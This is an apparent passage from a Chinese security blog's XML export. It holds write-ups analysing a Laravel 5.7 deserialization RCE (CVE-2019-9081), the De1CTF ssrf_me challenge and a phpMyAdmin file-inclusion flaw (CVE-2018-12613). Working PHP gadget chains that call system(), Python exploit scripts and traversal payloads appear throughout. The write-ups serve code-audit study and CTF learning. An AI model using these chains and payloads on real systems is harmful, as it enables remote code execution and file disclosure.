?&gt;";&#125;&#125;&#125; 一些思考 危险函数的寻找 eval，call_user_func phpstorm + xdebug 调试代码 PHP 序列化的时候 private 和 protected 变量会引入不可见字符 \x00，\00Test\00y 为 private，\00*\00 为 protected，注意这两个 \x00 就是 ascii 码为 0 的字符。这个字符显示和输出可能看不到，甚至导致截断，url 编码后就可以看得很清楚了。此时，为了更加方便进行反序列化 payload 的传输与显示，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示。 1234567891011121314&lt;?phpclass Test&#123; public $x="peri0d"; private $y="peri0d"; protected $z="peri0d";&#125;$k = new Test();echo serialize($k);// O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;?&gt; 反序列化测试代码 : 12345678910111213141516171819202122&lt;?php// 环境 : php 7.1.13 ntsclass Test&#123; public $x="peri0d"; private $y="peri0d"; protected $z="peri0d";&#125;$n = new Test();var_dump(serialize($n));var_dump(unserialize(serialize($n))); // 成功$k = 'O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;';var_dump(unserialize($k)); // 成功$m = 'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"\00Test\00y";s:6:"peri0d";s:4:"\00*\00z";s:6:"peri0d";&#125;';var_dump(unserialize($m)); // 失败$l = 'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"Testy";s:6:"peri0d";s:4:"*z";s:6:"peri0d";&#125;';var_dump(unserialize($l)); // 失败?&gt; 参考链接 https://xz.aliyun.com/t/5911 https://xz.aliyun.com/t/5866]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>Laravel</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel 5.7 RCE (CVE-2019-9081)]]></title>
    <url>%2F2019%2F08%2F10%2FLaravel%205.7%20RCE%2F</url>
    <content type="text"><![CDATA[Laravel 代码审计 环境搭建 Laravel 5.7 文档 : https://learnku.com/docs/laravel/5.7/installation/2242 Composer 下载 : wget https://getcomposer.org/download/1.8.6/composer.phar 获取 composer.phar 参照 https://www.jianshu.com/p/438a95046403 安装 Composer 和 Laravel composer create-project laravel/laravel laravel57 &quot;5.7.*&quot; 安装 Laravel 5.7 并生成 laravel57 项目 进入项目文件夹，使用 php artisan serve 启动 web 服务 在 laravel57/routes/web.php 文件添加路由 1Route::get("/","\App\Http\Controllers\DemoController@demo"); 在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器 1234567891011121314namespace App\Http\Controllers;class DemoController&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); return "peri0d"; &#125; &#125;&#125; Laravel 项目文件夹结构 app : 包含了应用的核心代码 Broadcasting : 包含应用程序的所有广播频道类，默认不存在 Console : 包含了所有自定义的 Artisan 命令 Events : 存放了 事件类。可以使用事件来提醒应用其他部分发生了特定的操作，使应用程序更加的灵活和解耦。默认不存在 Exceptions : 包含了应用的异常处理器，也是应用抛出异常的好地方 Http : 包含了控制器、中间件和表单请求。几乎所有的进入应用的请求的处理逻辑都被放在这里 Jobs : 存放了应用中的 队列任务 。 应用的任务可以被推送到队列或者在当前请求的生命周期内同步运行。在当前请求期间同步运行的任务可以看做是一个「命令」，因为它们是 命令模式 的实现。默认不存在 Listeners : 包含了用来处理 事件 的类。事件监听器接收事件实例并执行响应该事件被触发的逻辑。默认不存在 Mail : 包含应用所有的邮件发送类。默认不存在 Notifications : 包含应用发送的所有「业务性」通知，比如关于在应用中发生的事件的简单通知。默认不存在 Policies : 包含了应用的授权策略类。策略可以用来决定一个用户是否有权限去操作指定资源。默认不存在 Providers : 包含应用的所有服务提供者。服务提供者通过在服务容器中绑定服务、注册事件、以及执行其他任务来为即将到来的请求做准备来启动应用。 Rules : 包含应用自定义验证规则对象。这些规则意在将复杂的验证逻辑封装在一个简单的对象中。默认不存在 bootstrap : 包含启动框架的 app.php ，还包含 cache 目录，其下存放框架生成的用来提升性能的文件，比如路由和服务缓存文件 config : 包含应用程序所有的配置文件 database : 包含数据填充和迁移文件以及模型工厂类 public : 包含入口文件 index.php，它是进入应用程序的所有请求的入口点。还包含一些资源文件，比如图片、JS 和 CSS resources : 包含了视图和未编译的资源文件(如 LESS、SASS 或 JavaScript )。此目录还包含所有的语言文件 routes : 包含了应用的所有路由定义 storage : 包含编译后的 Blade 模板、session 会话生成的文件、缓存文件以及框架生成的其他文件 tests : 包含自动化测试文件 vendor : 包含所有的 Composer 依赖包，其中也包含了 Laravel 源码 第一种漏洞分析 漏洞触发点位于 Illuminate/Foundation/Testing/PendingCommand.php 中的 run 方法，该文件的功能就是命令执行并获取输出，PendingCommand.php 又定义了 __destruct() 方法，思路就是构造 payload 触发 __destruct() 方法进而调用 run 方法实现 rce 根据已有的 exp 来看，PendingCommand 类的属性如下 1234$this-&gt;app; // 一个实例化的类 Illuminate\Foundation\Application$this-&gt;test; // 一个实例化的类 Illuminate\Auth\GenericUser$this-&gt;command; // 要执行的php函数 system$this-&gt;parameters; // 要执行的php函数的参数 array('id') 在 unserialize($code) 处下断点调试，观察调用栈，发现有几个加载函数，spl_autoload_call() 、Illuminate\Foundation\AliasLoader-&gt;load() 、Composer\Autoload\ClassLoader-&gt;loadClass() 、Composer\Autoload\includeFile() 。 在加载完所需要的类后，会进入 PendingCommand 类的 __destruct() 方法。由于 hasExecuted 默认是 false，所以会去执行 run() 函数，run() 函数会在第 8 行执行命令，其代码如下 1234567891011121314public function run()&#123; $this-&gt;hasExecuted = true; $this-&gt;mockConsoleOutput(); try &#123; $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); &#125; catch (NoMatchingExpectationException $e) &#123; if ($e-&gt;getMethodName() === 'askQuestion') &#123; $this-&gt;test-&gt;fail('Unexpected question "'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'" was asked.'); &#125; throw $e;&#125; run() 中首先执行了 mockConsoleOutput() ，该函数主要功能就是模拟控制台输出，此时又会加载一些所需要的类。代码如下 12345678910111213141516171819protected function mockConsoleOutput()&#123; $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [(new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),]); foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123; $mock-&gt;shouldReceive('askQuestion') -&gt;once() -&gt;ordered() -&gt;with(Mockery::on(function ($argument) use ($question) &#123; return $argument-&gt;getQuestion() == $question[0]; &#125;)) -&gt;andReturnUsing(function () use ($question, $i) &#123; unset($this-&gt;test-&gt;expectedQuestions[$i]); return $question[1]; &#125;); &#125; $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123; return $mock; &#125;);&#125; mockConsoleOutput() 中又调用了 createABufferedOutputMock() 。在 createABufferedOutputMock() 函数中，首先调用 mock() 函数，它的作用主要是进行对象模拟。然后进入循环，要遍历 $this-&gt;test 类的 expectedOutput 属性，但是在可以实例化的类中不存在这个属性。当访问一个类中不存在的属性时会触发 __get() ，通过去触发 __get() 方法去进一步构造 pop 链。 12345678910111213141516private function createABufferedOutputMock()&#123; $mock = Mockery::mock(BufferedOutput::class.'[doWrite]') -&gt;shouldAllowMockingProtectedMethods() -&gt;shouldIgnoreMissing(); foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123; $mock-&gt;shouldReceive('doWrite') -&gt;once() -&gt;ordered() -&gt;with($output, Mockery::any()) -&gt;andReturnUsing(function () use ($i) &#123; unset($this-&gt;test-&gt;expectedOutput[$i]); &#125;); &#125; return $mock;&#125; 这里选择 Illuminate\Auth\GenericUser，其 __get() 魔术方法如下 1234public function __get($key)&#123; return $this-&gt;attributes[$key];&#125; 此时 $this-&gt;test 是我们传入的 Illuminate\Auth\GenericUser 的实例化对象，则 $this-&gt;attributes[$key] 通过反序列化是可控的，因此我们可以构造$this-&gt;attributes键名为expectedOutput的数组。这样一来$this-&gt;test-&gt;expectedOutput就会返回$this-&gt;attributes中键名为expectedOutput的数组 回到 mockConsoleOutput() 中，又进行了一次 for 循环，调用了 $this-&gt;test-&gt;expectedQuestions ，循环体与 createABufferedOutputMock() 大致相同，所以可以构造 $this-&gt;attributes键名为expectedQuestions的数组绕过 然后就可以走出 mockConsoleOutput() 方法，进入命令执行的关键点 $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); ，这里 Kernel::class 是个固定值，为 Illuminate\Contracts\Console\Kernel ，这里需要搞清楚 $this-&gt;app[Kernel::class] ，可以得到如下的函数调用顺序 Container.php:1222, Illuminate\Foundation\Application-&gt;offsetGet() 12345// key = Illuminate\Contracts\Console\Kernelpublic function offsetGet($key)&#123; return $this-&gt;make($key);&#125; Application.php:751, Illuminate\Foundation\Application-&gt;make() 123456789// abstract = Illuminate\Contracts\Console\Kernelpublic function make($abstract, array $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); if (isset($this-&gt;deferredServices[$abstract]) &amp;&amp; ! isset($this-&gt;instances[$abstract])) &#123; $this-&gt;loadDeferredProvider($abstract); &#125; return parent::make($abstract, $parameters);&#125; Container.php:609, Illuminate\Foundation\Application-&gt;make() 12345// abstract = Illuminate\Contracts\Console\Kernelpublic function make($abstract, array $parameters = [])&#123; return $this-&gt;resolve($abstract, $parameters);&#125; Container.php:652, Illuminate\Foundation\Application-&gt;resolve() 123456789101112131415161718192021222324252627// abstract = Illuminate\Contracts\Console\Kernelprotected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null($this-&gt;getContextualConcrete($abstract)); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; return $this-&gt;instances[$abstract]; &#125; $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); // concrete = Illuminate\Foundation\Application if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete); &#125; else &#123; $object = $this-&gt;make($concrete); &#125; foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object;&#125; Container.php:697, Illuminate\Foundation\Application-&gt;getConcrete() 1234567891011// abstract = Illuminate\Contracts\Console\Kernelprotected function getConcrete($abstract)&#123; if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123; return $concrete; &#125; if (isset($this-&gt;bindings[$abstract])) &#123; return $this-&gt;bindings[$abstract]['concrete']; &#125; return $abstract;&#125; 在getConcrete（）方法中出了问题，导致可以利用 php 的反射机制实例化任意类。在 getConcrete() 方法中，判断 $this-&gt;bindings[$abstract]) 是否存在，若存在则返回 $this-&gt;bindings[$abstract][&#39;concrete&#39;] 。bindings 是 Container.php 中 Container 类的属性，因此我们只需要找到一个继承自 Container 的类，就可以通过反序列化控制 $this-&gt;bindings 属性。Illuminate\Foundation\Application 继承自 Container 类。$abstract 为Illuminate\Contracts\Console\Kernel ，只需通过反序列化定义 Illuminate\Foundation\Application 的 $bindings 属性存在键名为 Illuminate\Contracts\Console\Kernel 的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是 Illuminate\Foundation\Application 类。 在实例化 Application类 的时候， 要满足 isBuildable() 才可以进行 build 1234protected function isBuildable($concrete, $abstract)&#123; return $concrete === $abstract || $concrete instanceof Closure;&#125; 此时明显不满足条件，所以接着执行 $object = $this-&gt;make($concrete); ，在 make() 函数中成功将 $abstract 重新赋值为 Illuminate\Foundation\Application，从而成功绕过 isBuildable() 函数，进入 $this-&gt;build 方法，就能看到使用ReflectionClass反射机制，实例化我们传入的类。 在返回一个 Illuminate\Foundation\Application 对象之后，exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); 又调用了 call() 方法，由于 Illuminate\Foundation\Application 没有 call() 方法，所以会调用父类 Illuminate\Container\Container 的 call() 方法。 1234public function call($callback, array $parameters = [], $defaultMethod = null)&#123; return BoundMethod::call($this, $callback, $parameters, $defaultMethod);&#125; 跟进 BoundMethod::call() 1234567891011public static function call($container, $callback, array $parameters = [], $defaultMethod = null)&#123; if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123; return static::callClass($container, $callback, $parameters, $defaultMethod); &#125; return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123; return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); &#125;);&#125; 在 isCallableWithAtSign() 处判断回调函数是否为字符串并且其中含有 @ ，并且 $defaultMethod 默认为 null，很明显不满足条件，进入 callBoundMethod() ，该函数只是判断 $callback 是否为数组。后面的匿名函数直接调用 call_user_func_array() ，并且第一个参数我们可控，参数值为 system ，第二个参数由 getMethodDependencies() 方法返回。跟进 getMethodDependencies() 12345678protected static function getMethodDependencies($container, $callback, array $parameters = [])&#123; $dependencies = []; foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123; static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies); &#125; return array_merge($dependencies, $parameters);&#125; getCallReflector() 用于反射获取 $callback 的对象， 然后执行 addDependencyForCallParameter() 为 $callback 的对象添加一些参数，最后将我们传入的 $parameters 数组和 $dependencies 数组合并， $dependencies 数组为空。最后相当于执行了 call_user_func_array(&#39;system&#39;,array(&#39;id&#39;)) exp 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// gadgets.phpnamespace Illuminate\Foundation\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app) &#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Illuminate\Auth&#123; class GenericUser&#123; protected $attributes; public function __construct(array $attributes)&#123; $this-&gt;attributes = $attributes; &#125; &#125;&#125;namespace Illuminate\Foundation&#123; class Application&#123; protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind)&#123; $this-&gt;bindings=$bind; &#125; &#125;&#125;?&gt; 123456789101112131415161718192021222324&lt;?php// chain.php$genericuser = new Illuminate\Auth\GenericUser( array( "expectedOutput"=&gt;array("0"=&gt;"1"), "expectedQuestions"=&gt;array("0"=&gt;"1") ));$application = new Illuminate\Foundation\Application( array( "Illuminate\Contracts\Console\Kernel"=&gt; array( "concrete"=&gt;"Illuminate\Foundation\Application" ) ));$exp = new Illuminate\Foundation\Testing\PendingCommand( "system",array('id'), $genericuser, $application);echo urlencode(serialize($exp));?&gt; 调用栈分析 : 12345678910111213141516171819202122232425262728293031323334353637383940414243Illuminate\Foundation\Testing\PendingCommand-&gt;__destruct() $test = Illuminate\Auth\GenericUser attributes = array( "expectedOutput"=&gt;array("0"=&gt;"1"), "expectedQuestions"=&gt;array("0"=&gt;"1") ) $app = Illuminate\Foundation\Application array( "Illuminate\Contracts\Console\Kernel" =&gt; array( array("concrete"=&gt;"Illuminate\Foundation\Application") ) ) $command = "system" $parameters = array("id")Illuminate\Foundation\Testing\PendingCommand-&gt;run() Illuminate\Foundation\Testing\PendingCommand-&gt;mockConsoleOutput() Illuminate\Foundation\Testing\PendingCommand-&gt;createABufferedOutputMock() // 在 foreach 中访问 expectedOutput 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法 Illuminate\Auth\GenericUser-&gt;__get() // return attributes["expectedOutput"] // return array("0"=&gt;"1") // 在 foreach 中访问 expectedQuestions 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法 Illuminate\Auth\GenericUser-&gt;__get() // return attributes["expectedQuestions"] // return array("0"=&gt;"1")// Application 继承了 Container 所以这相当于执行父类的 offsetGet()Illuminate\Foundation\Application-&gt;offsetGet() // key : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;make() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;make() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;resolve() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;getConcrete() // $this-&gt;bindings[$abstract]['concrete'] : Illuminate\Foundation\Application Illuminate\Foundation\Application-&gt;call() Illuminate\Container\BoundMethod-&gt;call() Illuminate\Container\BoundMethod-&gt;getMethodDependencies() 第二种漏洞分析 同样的，在 PendingCommand 类的 mockConsoleOutput() 函数处，去触发 __get() 方法构造 pop 链，这里选择 Faker\DefaultGenerator 类，其 __get() 方法如下 : 1234public function __construct($default = null)&#123; $this-&gt;default = $default;&#125; 同样的方法绕过 mockConsoleOutput() 函数，运行到 $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); 处。只不过这次的关注点在于 resolve() 函数的 $this-&gt;instances[$abstract] 处 123456789101112131415161718192021222324252627// abstract = Illuminate\Contracts\Console\Kernelprotected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null($this-&gt;getContextualConcrete($abstract)); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; // 在这里返回一个可控的实例化对象 return $this-&gt;instances[$abstract]; &#125; $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete); &#125; else &#123; $object = $this-&gt;make($concrete); &#125; foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object;&#125; instances 是 Container.php 中 Container 类的属性。因此我们只需要找到一个继承自 Container 的类，就可以通过反序列化控制 $this-&gt;instances 属性。Illuminate\Foundation\Application 继承自 Container 类。$abstract 为Illuminate\Contracts\Console\Kernel ，只需通过反序列化定义 Illuminate\Foundation\Application 的 $instances 属性存在键名为 Illuminate\Contracts\Console\Kernel 的数组就能返回我们要实例化的类名。在这里返回的是 Illuminate\Foundation\Application 类。 其余的就和第一种相同了，不同点在于构造可控实例化对象的方法不同 exp : 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// gadgets.phpnamespace Illuminate\Foundation\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app) &#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\Foundation&#123; class Application&#123; protected $instances = []; public function __construct($instance)&#123; $this-&gt;instances["Illuminate\Contracts\Console\Kernel"] = $instance; &#125; &#125;&#125;?&gt; 123456789&lt;?php// chain.php$defaultgenerator = new Faker\DefaultGenerator(array("expectedOutput"=&gt;array("0"=&gt;"1"),"expectedQuestions"=&gt;array("0"=&gt;"1")));$app = new Illuminate\Foundation\Application();$application = new Illuminate\Foundation\Application($app);$pendingcommand = new Illuminate\Foundation\Testing\PendingCommand('system', array('id'), $defaultgenerator, $application);echo urlencode(serialize($pendingcommand));?&gt; 思考 代码调试的技巧 函数调用栈的分析 可控点的寻找 参考链接 https://xz.aliyun.com/t/5483 https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/ https://www.jianshu.com/p/438a95046403]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>Laravel</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[De1CTF web ssrf_me 的三种方法]]></title>
    <url>%2F2019%2F08%2F10%2FDe1CTF%20web%20ssrf_me%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[原帖地址 : https://xz.aliyun.com/t/5927 De1CTF 2019 的一个题目总结 题目描述 直接查看页面源代码可以看到正确格式的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if "scan" in self.action: tmpfile = open("./%s/result.txt" % self.sandbox, 'w') resp = scan(self.param) if (resp == "Connection Timeout"): result['data'] = resp else: print(resp) tmpfile.write(resp) tmpfile.close() result['code'] = 200 if "read" in self.action: f = open("./%s/result.txt" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = "Action Error" else: result['code'] = 500 result['msg'] = "Sign Error" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route("/geneSign", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get("action")) param = urllib.unquote(request.args.get("param", "")) sign = urllib.unquote(request.cookies.get("sign")) ip = request.remote_addr if(waf(param)): return "No Hacker!!!!" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open("code.txt","r").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return "Connection Timeout"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith("gopher") or check.startswith("file"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 提示给的是 flag 在 ./flag.txt 中，题目单词打错了 python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战 大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action) 哈希拓展攻击 这是这道题最多的解法，介绍 : https://joychou.org/web/hash-length-extension-attack.html secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取 md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;) 的值，为 8370bdba94bd5aaf7427b84b3f52d7cb，而目标则是获取 md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;) 的值 使用 hashpump 即可 1234567root@peri0d:~/HashPump# hashpumpInput Signature: 8370bdba94bd5aaf7427b84b3f52d7cbInput Data: scanInput Key Length: 24Input Data to Add: readd7163f39ab78a698b3514fd465e4018ascan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read exp : 1234567891011import requestsurl = 'http://139.180.128.86/De1ta?param=flag.txt'cookies = &#123; 'sign': 'd7163f39ab78a698b3514fd465e4018a', 'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read', &#125;res = requests.get(url=url, cookies=cookies)print(res.text) 字符串拼接 试着访问了一下 /geneSign?param=flag.txt ，给出了一个 md5 8370bdba94bd5aaf7427b84b3f52d7cb ，但是只有 scan 的功能，想加入 read 功能就要另想办法了 1234def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param) 看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。 直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;) ，等价于 md5(&#39;xxxflag.txtreadscan&#39;) ，这就达到了目标。 直接访问 /De1ta?param=flag.txt 构造 cookie action=readscan;sign=7cde191de87fe3ddac26e19acae1525e 即可 local_file 天枢大佬们的做法 : https://xz.aliyun.com/t/5921#toc-16 放上他们的 exp : 12345678910111213141516171819202122232425262728293031import requestsconn = requests.Session()url = "http://139.180.128.86"def geneSign(param): data = &#123; "param": param &#125; resp = conn.get(url+"/geneSign",params=data).text print resp return respdef challenge(action,param,sign): cookie=&#123; "action":action, "sign":sign &#125; params=&#123; "param":param &#125; resp = conn.get(url+"/De1ta",params=params,cookies=cookie) return resp.textfilename = "local_file:///app/flag.txt"a = []for i in range(1): sign = geneSign("&#123;&#125;read".format(filename.format(i))) resp = challenge("readscan",filename.format(i),sign) if("title" in resp): a.append(i) print resp,iprint a 请求 /geneSign?param=local_file:///app/flag.txtread 获取 md5 值为 60ff07b83381a35d13caaf2daf583c94 ，即 md5(secert_key + &#39;local_file:///app/flag.txtread&#39; + &#39;scan&#39;) 然后再请求 /De1ta?param=local_file:///app/flag.txt 构造 cookie action=readscan;sign=60ff07b83381a35d13caaf2daf583c94 以上就是他们 exp 做的事情，和上一个方法差不多 关于 local_file : https://bugs.python.org/issue35907 这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ，否则会报 ValueError: unknown url type: /path/to/file 的错误]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>De1CTF</tag>
        <tag>ssrf_me</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-12613 的一些思考]]></title>
    <url>%2F2019%2F06%2F28%2FCVE-2018-12613%20%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现 CVE-2018-12613 的一些思考，关于文件包含路径的问题 漏洞/index.php 第 55 行 12345678910111213$target_blacklist = array ( 'import.php', 'export.php');if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) &#123; include $_REQUEST['target']; exit;&#125; 传入参数 target 需要满足 不以 index.php 开头 不在 target_blacklist 中 通过 checkPageValidity() 函数检验 checkPageValidity() 函数 12345678910111213141516171819202122232425262728293031323334public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 第一个返回 True 的地方，直接将 page 与 whitelist 比较，传入的必须是白名单里的文件名，无法绕过 123if (in_array($page, $whitelist)) &#123; return true;&#125; 第二个返回 True 的地方，mb_strpos($x, $y) 函数查找 $y 在 $x 中首次出现的位置。mb_substr($str, $start, $length) 函数从 $str 中，截取从 $start 位置开始，长度为 $length 的字符串。 但是在这里如果直接构造 payload : ?target=db_sql.php?/../../../cookie.txt 并不能跨路径包含，? 后面的字符串会被当做传入 db_sql.php 的参数，这就要利用后面的 urldecode 了 12345678$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') );if (in_array($_page, $whitelist)) &#123; return true;&#125; 第三个返回 True 的地方，可以利用双重编码绕过，将 ? 经过两次编码 %253f 就可以绕过白名单验证。%253f 传入时，首先会被自动解码一次，变成 %3f，然后urldecode() 再解码一次，就变成了 ? 此时的 payload : ?target=db_sql.php%253f/../../../cookie.txt 123456789$_page = urldecode($page);$_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') );if (in_array($_page, $whitelist)) &#123; return true; &#125; 问题 include &#39;db_sql.php%253f/../../../cookie.txt&#39; 为什么只会包含 cookie.txt 而不会包含 db_sql.php 传入 db_sql.php%253f/../../../cookie.txt 为什么会在 in_array($_page, $whitelist) 处返回 True 如图，z.php 中 include 两个 ../ 可以包含，y.php 中一个 include 也可以包含 在 php 的 include 中，include &#39;hint.php?/../cookie.txt&#39;; 会报错，include &#39;hint.php%3f/../cookie.txt&#39;; 不会报错，且可以成功包含 一些解释在 include 中，举个例子，假设 x.php 代码包含 include &#39;1source.phps/../cookie.txt&#39;; ，假设 1source.phps 